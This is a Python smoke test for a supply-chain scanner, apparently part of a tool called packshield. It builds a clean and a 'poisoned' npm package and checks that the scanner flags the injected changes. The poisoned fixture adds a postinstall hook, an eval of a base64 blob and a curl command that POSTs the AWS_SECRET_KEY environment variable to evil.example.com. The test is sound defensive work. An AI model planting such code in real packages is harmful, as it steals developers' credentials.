"""
Smoke test for the S3 JS/esprima parsing path (packshield/signals/
s3_signature.py's _analyze_js_file). This was written against esprima's
documented API but never executed anywhere until now -- this script is
that first real verification.

Creates two synthetic package directories (clean "v1" vs poisoned "v2",
same injected changes as the earlier Python self-test: eval() on an
obfuscated blob, env access, subprocess-equivalent, a new install hook)
and confirms extract_signature + diff_signatures correctly detect every
injected change.

Usage:
    pip install esprima
    python -m packshield.tools.smoketest_s3_js
"""

import shutil
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from packshield.signals.s3_signature import extract_signature
from packshield.signals.s3_diff import diff_signatures

CLEAN_PACKAGE_JSON = """{
  "name": "testpkg",
  "version": "1.0.0",
  "scripts": {}
}
"""

CLEAN_INDEX_JS = """
const http = require('http');

function fetchData(url, callback) {
    http.get(url, callback);
}

module.exports = { fetchData };
"""

POISONED_PACKAGE_JSON = """{
  "name": "testpkg",
  "version": "1.0.1",
  "scripts": {
    "postinstall": "node ./steal.js"
  }
}
"""

POISONED_INDEX_JS = """
const http = require('http');
const cp = require('child_process');

function fetchData(url, callback) {
    http.get(url, callback);
}

function exfiltrate() {
    const secret = process.env.AWS_SECRET_KEY;
    const payload = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgdGhhdCBkb2VzIG5vdCBsb29rIGxpa2Ugbm9ybWFsIHNvdXJjZSBjb2RlIGF0IGFsbCBhbmQgaXMgY2xlYXJseSBzdXNwaWNpb3VzIGluIGFueSBjb250ZXh0IHdlIG1pZ2h0IGVuY291bnRlciBpdA==";
    eval(payload);
    cp.exec('curl -X POST http://evil.example.com -d ' + secret);
}

module.exports = { fetchData, exfiltrate };
"""


def write_package(base_dir: Path, package_json: str, index_js: str):
    base_dir.mkdir(parents=True, exist_ok=True)
    (base_dir / "package.json").write_text(package_json, encoding="utf-8")
    (base_dir / "index.js").write_text(index_js, encoding="utf-8")


def main():
    try:
        import esprima  # noqa: F401
    except ImportError:
        print("FAIL: esprima is not installed. Run: pip install esprima")
        sys.exit(1)

    tmp = Path(tempfile.mkdtemp(prefix="packshield-s3-smoketest-"))
    try:
        v1_dir = tmp / "v1"
        v2_dir = tmp / "v2"
        write_package(v1_dir, CLEAN_PACKAGE_JSON, CLEAN_INDEX_JS)
        write_package(v2_dir, POISONED_PACKAGE_JSON, POISONED_INDEX_JS)

        print("Extracting signature for clean v1...")
        old_sig = extract_signature(str(v1_dir), "npm")
        print("Extracting signature for poisoned v2...")
        new_sig = extract_signature(str(v2_dir), "npm")

        print()
        print("OLD risky_calls per file:", {k: v["risky_calls"] for k, v in old_sig["files"].items()})
        print("NEW risky_calls per file:", {k: v["risky_calls"] for k, v in new_sig["files"].items()})
        print("OLD install_hooks:", old_sig["install_hooks"])
        print("NEW install_hooks:", new_sig["install_hooks"])

        for fname, info in new_sig["files"].items():
            if info.get("parse_error"):
                print(f"\nFAIL: esprima failed to parse {fname} -- check the error handling path.")
                sys.exit(1)

        result = diff_signatures(old_sig, new_sig)
        print()
        print(f"S3 SCORE: {result.score}")
        print("REASONS:")
        for r in result.reasons:
            print(" -", r)

        expected_categories = {"eval_or_dynamic_code", "child_process_or_subprocess", "env_access", "obfuscated_literal"}
        found_categories = set()
        for r in result.reasons:
            for cat in expected_categories:
                if cat in r:
                    found_categories.add(cat)

        missing = expected_categories - found_categories
        hook_detected = any("install hook" in r for r in result.reasons)

        print()
        if missing:
            print(f"FAIL: missing expected detections: {missing}")
            sys.exit(1)
        if not hook_detected:
            print("FAIL: postinstall hook addition was not detected")
            sys.exit(1)
        if result.score < 8.0:
            print(f"FAIL: score {result.score} is lower than expected given how many changes were injected")
            sys.exit(1)

        print("PASS: all expected detections found, esprima JS path is working correctly.")

    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    main()